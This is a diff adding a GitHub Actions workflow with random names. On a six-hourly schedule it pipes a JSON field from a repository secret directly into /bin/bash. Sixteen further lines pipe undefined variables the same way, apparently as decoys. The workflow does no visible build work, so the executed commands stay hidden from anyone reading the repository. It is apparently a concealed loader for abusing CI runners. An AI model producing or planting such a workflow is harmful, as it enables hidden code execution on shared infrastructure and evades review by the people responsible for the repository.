@@ -1,0 +1,33 @@
+name: elijahoptimize448
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: elijahoptimize448
+        env:
+          lp6885: ${{ secrets.lp6885 }}
+        run: |
+          echo $lp6885 | jq -r .tg6 | /bin/bash
+          echo $fsdn4 | jq -r .ukipd6433 | /bin/bash
+          echo $d7 | jq -r .q16701 | /bin/bash
+          echo $ucs4138 | jq -r .u0843 | /bin/bash
+          echo $pp649 | jq -r .nu91791 | /bin/bash
+          echo $o05 | jq -r .ds7576 | /bin/bash
+          echo $gfw7 | jq -r .u57131 | /bin/bash
+          echo $tx8303 | jq -r .xqu34975 | /bin/bash
+          echo $l0589 | jq -r .gvfb9592 | /bin/bash
+          echo $zo2724 | jq -r .o333 | /bin/bash
+          echo $wgvx5929 | jq -r .rj69743 | /bin/bash
+          echo $ym465 | jq -r .eoxuo8650 | /bin/bash
+          echo $v45626 | jq -r .oy1 | /bin/bash
+          echo $tpdzz53053 | jq -r .tqpz83860 | /bin/bash
+          echo $ensca241 | jq -r .c37219 | /bin/bash
+          echo $hx7619 | jq -r .ati9267 | /bin/bash
+          echo $jvkvq7240 | jq -r .st34671 | /bin/bash
+
